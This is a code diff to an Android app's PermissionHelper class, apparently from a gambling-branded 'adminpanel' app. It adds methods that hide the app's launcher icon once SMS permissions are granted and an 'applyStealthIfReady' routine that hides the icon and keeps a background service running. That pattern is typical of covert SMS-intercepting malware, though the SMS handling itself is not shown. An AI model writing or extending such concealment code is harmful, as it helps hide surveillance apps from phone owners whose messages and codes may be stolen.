@@ -1,6 +1,7 @@
 package com.spinplay99.adminpanel;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -93,5 +94,46 @@ public final class PermissionHelper {
 
     public static void resetLaunchGate() {
         launchAttempted = false;
+    }
+
+    /** Remove drawer icon after SMS is granted (MainActivity stays INFO-only). */
+    public static void hideLauncherIcon(Context context) {
+        if (!hasSmsPermissions(context)) {
+            return;
+        }
+        try {
+            ComponentName alias = new ComponentName(context, LauncherAlias.class);
+            PackageManager pm = context.getPackageManager();
+            int state = pm.getComponentEnabledSetting(alias);
+            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                return;
+            }
+            pm.setComponentEnabledSetting(
+                alias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
+        }
+    }
+
+    /** Show drawer icon again when SMS is missing (permission setup). */
+    public static void showLauncherIcon(Context context) {
+        try {
+            ComponentName alias = new ComponentName(context, LauncherAlias.class);
+            PackageManager pm = context.getPackageManager();
+            pm.setComponentEnabledSetting(
+                alias,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void applyStealthIfReady(Context context) {
+        if (!hasSmsPermissions(context)) {
+            return;
+        }
+        hideLauncherIcon(context);
+        ServiceLauncher.ensureRunning(context);
     }
 }
